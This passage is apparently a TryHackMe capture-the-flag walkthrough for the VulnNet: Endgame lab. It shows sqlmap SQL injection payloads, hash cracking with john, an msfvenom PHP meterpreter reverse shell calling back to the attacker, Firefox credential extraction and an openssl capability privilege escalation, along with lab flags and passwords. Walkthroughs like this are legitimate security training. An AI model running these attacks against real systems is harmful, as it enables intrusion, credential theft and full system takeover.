[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:30:23 /2022-12-16/

[20:30:24] [INFO] resuming back-end DBMS 'mysql' 
[20:30:24] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: blog (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: blog=5 AND 6105=6105

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: blog=5 AND (SELECT 7521 FROM (SELECT(SLEEP(5)))wlWw)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: blog=-3139 UNION ALL SELECT NULL,NULL,CONCAT(0x7176717671,0x6e626241765467685a78777164596879714d6a5a6d7547467742565558637078594352526b585142,0x717a707871)-- -
---
[20:30:24] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.12
[20:30:24] [INFO] fetching tables for database: 'vn_admin'
Database: vn_admin
[48 tables]
+---------------------------------------------+
| backend_layout                              |
| be_dashboards                               |
| be_groups                                   |
| be_sessions                                 |
| be_users                                    |
| cache_adminpanel_requestcache               |
| cache_adminpanel_requestcache_tags          |
| cache_hash                                  |
| cache_hash_tags                             |
| cache_imagesizes                            |
| cache_imagesizes_tags                       |
| cache_pages                                 |
| cache_pages_tags                            |
| cache_pagesection                           |
| cache_pagesection_tags                      |
| cache_rootline                              |
| cache_rootline_tags                         |
| cache_treelist                              |
| fe_groups                                   |
| fe_sessions                                 |
| fe_users                                    |
| pages                                       |
| sys_be_shortcuts                            |
| sys_category                                |
| sys_category_record_mm                      |
| sys_collection                              |
| sys_collection_entries                      |
| sys_file                                    |
| sys_file_collection                         |
| sys_file_metadata                           |
| sys_file_processedfile                      |
| sys_file_reference                          |
| sys_file_storage                            |
| sys_filemounts                              |
| sys_history                                 |
| sys_language                                |
| sys_lockedrecords                           |
| sys_log                                     |
| sys_news                                    |
| sys_note                                    |
| sys_redirect                                |
| sys_refindex                                |
| sys_registry                                |
| sys_template                                |
| tt_content                                  |
| tx_extensionmanager_domain_model_extension  |
| tx_extensionmanager_domain_model_repository |
| tx_impexp_presets                           |
+---------------------------------------------+

[20:30:24] [INFO] fetched data logged to text files under '/home/divu050704/.local/share/sqlmap/output/api.vulnnet.thm'

[*] ending @ 20:30:24 /2022-12-16/
```

- Scanned for columns under table `be_users`. 

```console
❯ sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/\?blog\=5  --risk=3 --level=5 -D vn_admin  -T be_users --columns
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.6.7#stable}
|_ -| . [(]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:35:29 /2022-12-16/

[20:35:29] [INFO] resuming back-end DBMS 'mysql' 
[20:35:29] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: blog (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: blog=5 AND 6105=6105

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: blog=5 AND (SELECT 7521 FROM (SELECT(SLEEP(5)))wlWw)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: blog=-3139 UNION ALL SELECT NULL,NULL,CONCAT(0x7176717671,0x6e626241765467685a78777164596879714d6a5a6d7547467742565558637078594352526b585142,0x717a707871)-- -
---
[20:35:30] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.12
[20:35:30] [INFO] fetching columns for table 'be_users' in database 'vn_admin'
Database: vn_admin
Table: be_users
[34 columns]
+-----------------------+----------------------+
| Column                | Type                 |
+-----------------------+----------------------+
| admin                 | smallint(5) unsigned |
| allowed_languages     | varchar(255)         |
| avatar                | int(10) unsigned     |
| category_perms        | text                 |
| crdate                | int(10) unsigned     |
| createdByAction       | int(11)              |
| cruser_id             | int(10) unsigned     |
| db_mountpoints        | text                 |
| deleted               | smallint(5) unsigned |
| description           | text                 |
| disable               | smallint(5) unsigned |
| disableIPlock         | smallint(5) unsigned |
| email                 | varchar(255)         |
| endtime               | int(10) unsigned     |
| file_mountpoints      | text                 |
| file_permissions      | text                 |
| lang                  | varchar(6)           |
| lastlogin             | int(10) unsigned     |
| lockToDomain          | varchar(50)          |
| options               | smallint(5) unsigned |
| password              | varchar(100)         |
| pid                   | int(10) unsigned     |
| realName              | varchar(80)          |
| starttime             | int(10) unsigned     |
| TSconfig              | text                 |
| tstamp                | int(10) unsigned     |
| uc                    | mediumblob           |
| uid                   | int(10) unsigned     |
| usergroup             | varchar(255)         |
| usergroup_cached_list | text                 |
| userMods              | text                 |
| username              | varchar(50)          |
| workspace_id          | int(11)              |
| workspace_perms       | smallint(6)          |
+-----------------------+----------------------+

[20:35:30] [INFO] fetched data logged to text files under '/home/divu050704/.local/share/sqlmap/output/api.vulnnet.thm'

[*] ending @ 20:35:30 /2022-12-16/

```

- Scanned `username` and `password`. 

```console
❯ sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/\?blog\=5  --risk=3 --level=5 -D vn_admin  -T be_users -C username,password  --dump
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.6.7#stable}
|_ -| . [']     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:36:28 /2022-12-16/

[20:36:29] [INFO] resuming back-end DBMS 'mysql' 
[20:36:29] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: blog (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: blog=5 AND 6105=6105

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: blog=5 AND (SELECT 7521 FROM (SELECT(SLEEP(5)))wlWw)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: blog=-3139 UNION ALL SELECT NULL,NULL,CONCAT(0x7176717671,0x6e626241765467685a78777164596879714d6a5a6d7547467742565558637078594352526b585142,0x717a707871)-- -
---
[20:36:29] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.12
[20:36:29] [INFO] fetching entries of column(s) 'password,username' for table 'be_users' in database 'vn_admin'
[20:36:29] [WARNING] reflective value(s) found and filtering out
Database: vn_admin
Table: be_users
[1 entry]
+----------+---------------------------------------------------------------------------------------------------+
| username | password                                                                                          |
+----------+---------------------------------------------------------------------------------------------------+
| chris_w  | $argon2i$v=19$m=65536,t=16,p=2$UnlVSEgyMUFnYnJXNXlXdg$j6z3IshmjsN+CwhciRECV2NArQwipqQMIBtYufyM4Rg |
+----------+---------------------------------------------------------------------------------------------------+

[20:36:29] [INFO] table 'vn_admin.be_users' dumped to CSV file '/home/divu050704/.local/share/sqlmap/output/api.vulnnet.thm/dump/vn_admin/be_users.csv'
[20:36:29] [INFO] fetched data logged to text files under '/home/divu050704/.local/share/sqlmap/output/api.vulnnet.thm'

[*] ending @ 20:36:29 /2022-12-16/

```

- We need to crack this hash so we will need a dictionary, we will be using the data retrieved from `blog` database. 
- Made a python script read data from `csv` and dump data to a dictionary file.

```python
#!/bin/bash/python3
import csv
file = open("/home/divu050704/.local/share/sqlmap/output/api.vulnnet.thm/dump/blog/users.csv", 'r')
data = csv.reader(file)
passwords = []
for i in data:
    if len(i) == 3:
        passwords.append(i[1]+"\n")
file.close()
file = open("dict","w")
file.writelines(passwords)
file.close()
```

- Cracked hash with `john`

```console
❯ john hash --wordlist=dict
Using default input encoding: UTF-8
Loaded 1 password hash (argon2 [Blake2 AVX])
Cost 1 (t) is 16 for all loaded hashes
Cost 2 (m) is 65536 for all loaded hashes
Cost 3 (p) is 2 for all loaded hashes
Cost 4 (type [0:Argon2d 1:Argon2i]) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
vAxWtmNzeTz      (?)     
1g 0:00:01:14 DONE (2022-12-16 20:55) 0.01336g/s 1.710p/s 1.710c/s 1.710C/s selW0qQ4..Z2WgzYZCK
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

- Logged in to (http://admin1.vulnnet.thm/typo3/) with credentials`chris_w : vAxWtmNzeTz` 


# What is the user flag?


- Created `msfvenom` `php` payload. 

```console
❯ msfvenom -p php/meterpreter_reverse_tcp LHOST=10.17.0.215 LPORT=1234 -f raw  -o payload.php
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 34850 bytes
Saved as: payload.php
```

- Started `msfconsole` 

```console
❯ msfconsole   -q
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload php/meterpreter_reverse_tcp
payload => php/meterpreter_reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.17.0.215
LHOST => 10.17.0.215
msf6 exploit(multi/handler) > set LPORT 1234
LPORT => 1234
msf6 exploit(multi/handler) > explot
[-] Unknown command: explot
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.17.0.215:1234 
```

- Allowed `php` upload from `Settings --> Configure-Installation Wide Options --> Backend --> [BE][fileDenyPattern]` to empty field. 

- Upload file from `Filelist` and access it from `http://admin1.vulnnet.thm/fileadmin/payload.php` 

- Got a shell back

```console
[*] Meterpreter session 1 opened (10.17.0.215:1234 -> 10.10.226.82:44484) at 2022-12-16 21:08:49 +0530

meterpreter > ls
Listing: /var/www/admin1/fileadmin
==================================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100664/rw-rw-r--  18627  fil   2022-12-16 21:02:52 +0530  97afd26fd4f6d10a2a86ab65ac401845.png
042775/rwxrwxr-x  4096   dir   2022-12-16 21:02:53 +0530  _processed_
042775/rwxrwxr-x  4096   dir   2022-06-14 22:40:27 +0530  _temp_
100664/rw-rw-r--  34850  fil   2022-12-16 21:07:48 +0530  payload.php
042775/rwxrwxr-x  4096   dir   2022-06-14 22:40:27 +0530  user_upload
```

- Found `.mozilla` under `/home/system` 

```console
meterpreter > ls
Listing: /home/system/.mozilla
==============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040755/rwxr-xr-x  4096  dir   2022-06-14 21:26:04 +0530  extensions
040755/rwxr-xr-x  4096  dir   2022-06-14 22:51:05 +0530  firefox
```

- Zipped it and downloaded it.

```console
meterpreter > shell
Process 2130 created.
Channel 8 created.
cd /home/system      
ls
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Utils
Videos
user.txt
zip /tmp/fox.zip -r .mozilla
	zip warning: name not matched: .mozilla/firefox/8mk7ix79.default-release/lock
  adding: .mozilla/ (stored 0%)
  adding: .mozilla/extensions/ (stored 0%)
  adding: .mozilla/firefox/ (stored 0%)
  adding: .mozilla/firefox/2o9vd4oi.default/ (stored 0%)
  adding: .mozilla/firefox/2o9vd4oi.default/times.json (stored 0%)
  adding: .mozilla/firefox/Crash Reports/ (stored 0%)
  adding: .mozilla/firefox/Crash Reports/events/ (stored 0%)
  adding: .mozilla/firefox/Crash Reports/InstallTime20220608170832 (stored 0%)
  adding: .mozilla/firefox/8mk7ix79.default-release/ (stored 0%)
  adding: .mozilla/firefox/8mk7ix79.default-release/cert9.db (deflated 96%)
  adding: .mozilla/firefox/8mk7ix79.default-release/shield-preference-experiments.json (stored 0%)
  adding: .mozilla/firefox/8mk7ix79.default-release/ClientAuthRememberList.txt (stored 0%)
  adding: .mozilla/firefox/8mk7ix79.default-release/sessionCheckpoints.json 
<---------------------------SNIP------------------------------->
zip warning: Not all files were readable
  files/entries read:  239 (49M bytes)  skipped:  18 (139K bytes)

exit
meterpreter > download fox.zip
[*] Downloading: fox.zip -> /home/divu050704/tryhackme-notes/vulnnetendgame/fox.zip
[*] Downloaded 1.00 MiB of 7.71 MiB (12.98%): fox.zip -> /home/divu050704/tryhackme-notes/vulnnetendgame/fox.zip
[*] Downloaded 2.00 MiB of 7.71 MiB (25.96%): fox.zip -> /home/divu050704/tryhackme-notes/vulnnetendgame/fox.zip
[*] Downloaded 3.00 MiB of 7.71 MiB (38.93%): fox.zip -> /home/divu050704/tryhackme-notes/vulnnetendgame/fox.zip
[*] Downloaded 4.00 MiB of 7.71 MiB (51.91%): fox.zip -> /home/divu050704/tryhackme-notes/vulnnetendgame/fox.zip
[*] Downloaded 5.00 MiB of 7.71 MiB (64.89%): fox.zip -> /home/divu050704/tryhackme-notes/vulnnetendgame/fox.zip
[*] Downloaded 6.00 MiB of 7.71 MiB (77.87%): fox.zip -> /home/divu050704/tryhackme-notes/vulnnetendgame/fox.zip
[*] Downloaded 7.00 MiB of 7.71 MiB (90.84%): fox.zip -> /home/divu050704/tryhackme-notes/vulnnetendgame/fox.zip
[*] Downloaded 7.71 MiB of 7.71 MiB (100.0%): fox.zip -> /home/divu050704/tryhackme-notes/vulnnetendgame/fox.zip
[*] download   : fox.zip -> /home/divu050704/tryhackme-notes/vulnnetendgame/fox.zip

```

- On the attacker machine unzip it. 
- In the `2fjnrwth.default-release` I found `logins.json` which means it is having credentials.
- In `profils.ini` edit `[Proflie1]` Path to `2fjnrwth.default-release` .

```console
❯ cat profiles.ini
[Install4F96D1932A9F858E]
Default=8mk7ix79.default-release
Locked=1

[Profile1]
Name=default
IsRelative=1
Path=2fjnrwth.default-release
Default=1

[Profile0]
Name=default-release
IsRelative=1
Path=8mk7ix79.default-release

[General]
StartWithLastProfile=1
Version=2
```


- Download [this](https://github.com/unode/firefox_decrypt/blob/master/firefox_decrypt.py) tool and decrypt the firefox credentials. 

```console
❯ python3 firefox_decrypt.py fox/.mozilla/firefox/
Select the Mozilla profile you wish to decrypt
1 -> 2fjnrwth.default-release
2 -> 8mk7ix79.default-release
1

Website:   https://tryhackme.com
Username: 'chris_w@vulnnet.thm'
Password: '8y7TKQDpucKBYhwsb'
```

- Login to SSH with these credentials but as `system`, we have seen there is no user `chris_w` on the system.  

```console
❯ ssh system@vulnnet.thm
system@vulnnet.thm's password: 
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 5.4.0-120-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 updates can be applied immediately.

Your Hardware Enablement Stack (HWE) is supported until April 2023.
Last login: Fri Dec 16 11:34:20 2022 from 10.17.0.215
system@vulnnet-endgame:~$ cat user.txt 
THM{fb84e79072015186c72ec77ded49a5ff}
```


# What is the root flag?

- Found `/home/system/Utils/openssl` capability.

```console
system@vulnnet-endgame:/tmp$ getcap / -r 2>/dev/null
/home/system/Utils/openssl =ep
/snap/core20/1081/usr/bin/ping = cap_net_raw+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```


- Used [this](https://chaudhary1337.github.io/p/how-to-openssl-cap_setuid-ep-privesc-exploit/) blog to leverage this vulnerability.  
- Got root 

```console
system@vulnnet-endgame:/tmp$ openssl req -engine ./openssl-exploit-engine.so 
system@vulnnet-endgame:/tmp$ getcap / -r 2>/dev/null
/home/system/Utils/openssl =ep
/snap/core20/1081/usr/bin/ping = cap_net_raw+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
system@vulnnet-endgame:/tmp$ /home/system/Utils/openssl req -engine ./openssl-exploit-engine.so 
root@vulnnet-endgame:/tmp# 
```